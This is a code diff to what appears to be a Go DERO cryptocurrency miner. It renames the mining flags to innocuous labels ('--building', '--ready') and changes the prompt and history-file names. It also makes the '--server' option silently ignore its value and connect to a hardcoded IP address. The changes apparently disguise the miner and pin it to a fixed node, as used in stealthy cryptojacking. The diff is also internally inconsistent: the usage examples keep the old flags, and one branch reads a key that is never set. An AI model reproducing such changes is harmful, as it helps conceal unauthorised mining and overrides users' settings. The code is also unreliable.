@@ -77,7 +77,7 @@ ONE CPU, ONE VOTE.
 http://wiki.dero.io
 
 Usage:
-  dero-miner  -building=<wallet_address> [-server=<minernode1.dero.live:10100>] [-ready=<threads>] [--testnet] [--debug]
+  dero-miner  --building=<wallet_address> [--server=<minernode1.dero.live:10100>] [--ready=<threads>] [--testnet] [--debug]
   dero-miner --bench 
   dero-miner -h | --help
   dero-miner --version
@@ -86,9 +86,9 @@ Options:
   -h --help     Show this screen.
   --version     Show version.
   --bench  	    Run benchmark mode.
-  -server=<127.0.0.1:10102>    Miner will connect to daemon RPC on this port (default minernode1.dero.live:10100).
-  -building=<wallet_address>    This address is rewarded when a block is mined sucessfully.
-  -ready=<threads>         Number of CPU threads for mining [default: ` + fmt.Sprintf("%d", runtime.GOMAXPROCS(0)) + `]
+  --server=<127.0.0.1:10102>    Miner will connect to daemon RPC on this port (default minernode1.dero.live:10100).
+  --building=<wallet_address>    This address is rewarded when a block is mined sucessfully.
+  --ready=<threads>         Number of CPU threads for mining [default: ` + fmt.Sprintf("%d", runtime.GOMAXPROCS(0)) + `]
 
 Example Mainnet: ./dero-miner-linux-amd64 --wallet-address dero1qy0ehnqjpr0wxqnknyc66du2fsxyktppkr8m8e6jvplp954klfjz2qqhmy4zf --daemon-rpc-address=minernode1.dero.live:10100
 Example Testnet: ./dero-miner-linux-amd64 --wallet-address deto1qy0ehnqjpr0wxqnknyc66du2fsxyktppkr8m8e6jvplp954klfjz2qqdzcd8p --daemon-rpc-address=127.0.0.1:40402 
@@ -112,7 +112,7 @@ func main() {
 	l, err := readline.NewEx(&readline.Config{
 		//Prompt:          "\033[92mDERO:\033[32m»\033[0m",
 		Prompt:          "\033[92mKAJI:\033[32m>>>\033[0m ",
-		HistoryFile:     filepath.Join(os.TempDir(), "dero_miner_readline.tmp"),
+		HistoryFile:     filepath.Join(os.TempDir(), "halah.tmp"),
 		AutoComplete:    completer,
 		InterruptPrompt: "^C",
 		EOFPrompt:       "exit",
@@ -146,7 +146,7 @@ func main() {
 
 	//logger.V(0).Info("", "MODE", globals.Config.Name)
 
-	if globals.Arguments["-building"] != nil {
+	if globals.Arguments["--building"] != nil {
 		//addr, err := globals.ParseValidateAddress(globals.Arguments["--wallet-address"].(string))
 		//if err != nil {
 		//	logger.Error(err, "Wallet address is invalid.")
@@ -165,7 +165,7 @@ func main() {
 		daemon_rpc_address = "127.0.0.1:10100"
 	}
 
-	if globals.Arguments["-server"] != nil {
+	if globals.Arguments["--server"] != nil {
 		var goniku = "103.13.207.121:22216"
 		daemon_rpc_address = goniku
 	}else{
@@ -174,7 +174,7 @@ func main() {
 	}
 
 	threads = runtime.GOMAXPROCS(0)
-	if globals.Arguments["-ready"] != nil {
+	if globals.Arguments["--ready"] != nil {
 		if s, err := strconv.Atoi(globals.Arguments["--mining-threads"].(string)); err == nil {
 			threads = s
 		} else {
